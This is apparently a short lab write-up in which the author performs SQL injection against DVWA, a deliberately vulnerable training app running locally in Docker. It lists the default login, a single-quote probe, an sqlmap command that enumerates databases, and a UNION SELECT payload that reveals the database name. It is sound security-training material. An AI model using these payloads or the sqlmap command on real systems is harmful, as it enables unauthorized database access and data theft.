# 💉 SQL Injection – DVWA

## 📌 Overview
In this task, I performed SQL Injection on DVWA (Damn Vulnerable Web Application) to understand how weak input validation can expose the database.

All testing was done in a safe Docker environment.

---

## 🎯 Target
- Application: DVWA  
- URL: http://localhost:8081  
- Module: SQL Injection  
- Security Level: LOW  

---

## 🧪 Steps Performed

### 1. Access DVWA
- Logged into DVWA  
  - Username: admin  
  - Password: password  
- Set security level to LOW  

---

### 2. Identify Input Field
- Go to: DVWA → Vulnerabilities → SQL Injection  
- Input parameter found: id=1  

---

### 3. Basic SQL Injection Test

#### Payload:
'
#### Result:
- SQL error displayed  
- Input is not filtered  
- Vulnerability confirmed  

---

### 🤖 Automated Testing (SQLMap)

sqlmap -u "http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=yourid; security=low" -p id --dbs

- Extracted database names automatically  

---

### 🔗 UNION Injection

' UNION SELECT null, database()-- -

- Retrieved current database name  

---

## ✅ Result
- SQL Injection vulnerability confirmed  
- Database details extracted successfully  

---

## 🛠️ Tools Used
- DVWA  
- SQLMap  
- Web Browser  
